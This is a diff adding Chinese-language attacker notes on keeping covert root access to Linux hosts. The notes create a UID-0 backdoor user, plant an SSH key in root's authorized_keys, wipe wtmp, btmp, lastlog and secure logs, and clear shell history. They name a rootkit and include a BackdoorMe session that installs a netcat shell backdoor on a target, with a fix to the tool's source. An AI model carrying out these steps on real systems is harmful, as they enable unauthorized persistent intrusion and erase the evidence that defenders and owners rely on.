@@ -1,0 +1,90 @@
+adduser yks
+passwd yks
+
+vi /etc/passwd
+yks:x:0:502::/home/yks:/bin/bash
+
+客户端【44.4】：
+	生成公钥	
+	ssh-keygen -t rsa
+	cd .ssh/
+
+上传公钥到服务器【44.3】：
+	scp id_rsa.pub root@192.168.44.3/root
+	追加进去，可以存在多个公钥，让多个用户同时登陆
+    cat id_rsa.pub >> /root/.ssh/authorized_keys
+    chmod 600 /root/.ssh/authorized_keys
+
+-----------------------------------------------------------------
+mkdir /root/.ssh
+vi /root/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAtrXPgb98RmgVvXr9NNa71Eblzh+KfLuRwGIkCW9tfJwltjsnbzolvrfozR8CFZOg6cNCsiJFau3cnY2NB59M9grDGJVm0lUjWh0xGKsybG8EKxkBwJDsN3C1/8GVZF5U1323ZiydIjaiHmsIP1vpkq7NLdDq/JbGkj7yjysROVU7T9/HFjhUswhSHlTS7apS3fKqMKUVNd10UZqdi2K82ratKVC9T1ljJApn4ByKK9U+wkPt2pWRuX8/kdpCOrLPlcTaDso62Naltid2Sm3wY6Xrct0kwiypAULas15lfWeeVLqlAqUzqN1zw06/IG4toi8y/UfWBNVH0PrI6LIxuw== rsa 2048-042418
+
+    vi /etc/ssh/sshd_config
+		RSAAuthentication yes
+		PubkeyAuthentication yes
+		AuthorizedKeysFile      .ssh/authorized_keys
+   	
+   	service sshd restart
+-----------------------------------------------------------------
+cat /root/.ssh/authorized_keys
+scp root@192.168.8.50:/root/.ssh/authorized_keys /root/.ssh/authorized_keys
+
+cho > /var/log/wtmp
+echo > /var/log/btmp
+echo > /var/log/lastlog
+echo > /var/log/secure
+history -r
+history -c
+
+mafix rootkit
+lsattr ifconfig
+chattr -a ifconfig
+
+后门程序：https://github.com/Kkevsterrr/backdoorme
+
+  ___           __      __              __  ___
+  / _ )___ _____/ /_____/ /__  ___  ____/  |/  /__ 
+ / _  / _ `/ __/  '_/ _  / _ \/ _ \/ __/ /|_/ / -_)
+/____/\_,_/\__/_/\_\\_,_/\___/\___/_/ /_/  /_/\__/ 
+Welcome to BackdoorMe, a powerful backdooring utility. Type "help" to see the list of available commands.
+Type "addtarget" to set a target, and "open" to open an SSH connection to that target.
+Using local IP of 10.100.13.131.
+>> addtarget
+Target Hostname: 10.100.13.138
+Username: root
+Password: 
+ + Target 2 Set!
+>>  use shell/netcat_traditional #启动nc后门
+ + Using current target 2.
+ - No SSH connection to target. Attempting to open a connection...
+ + Connection established.
+ + Using netcat-traditional module
+(nct) >> 
+
+touch /bin/nc.traditional
+
+>> use shell/netcat
+netcat              netcat_traditional  
+>> use shell/netcat_traditional  #选择后门方式list backdoors
+ + Using current target 2.
+ - No SSH connection to target. Attempting to open a connection...
+ + Connection established.
+ + Using netcat-traditional module
+
+(nct) >> exploit                 #对所有主机安装bash后门，open单独安装
+ + Shipping netcat-traditional package.
+ + Shipping files: 
+ + /bin/nc.traditional
+ + Initializing backdoor on port 53926...
+ + Backdoor attempted. Use nc 10.100.13.138 53926.
+(nct) >> 
+
+
+
+netcat-traditional   利用netcat的-e参数建立一个反向shell还有其他类型后门，你可以根据自己额需要安装，可以参考https://www.92aq.com/2016/01/23/backdoorme-unix系后门工具.html，paramiko.ssh_exception.SSHException: key cannot be used for signing
+但是，有个地方需要注意下，这个源码需要修改一下，否则会有bug，比如会报错：
+修改target.py,self.ssh.connect(self.hostname, port=self.port, username=self.uname, password=self.pword,allow_agent=False,look_for_keys=False)在后面的括号里添加allow_agent=False,look_for_keys=False两个参数就行了，因为这个问题很玄学，这跟paramiko库有关系。好像并不是所有linux都会遇到。
+
+backdoorme依赖于与目标机器的ssh连接或者ssh证书，它将通过这个连接或证书传输后门并部署在目标机器上。不过，未来在工具扩展后，也会去掉这种依赖。(如果不知道如何设置ssh，请移步这里：https://help.ubuntu.com/community/SSH/OpenSSH/Configuring需要配置ssh，感觉很麻烦，所以看了下源码，根本不需要改ssh，所以我用的时候加两个参数就行了。实际上如果还要配置ssh，这个工具就不方便了
+
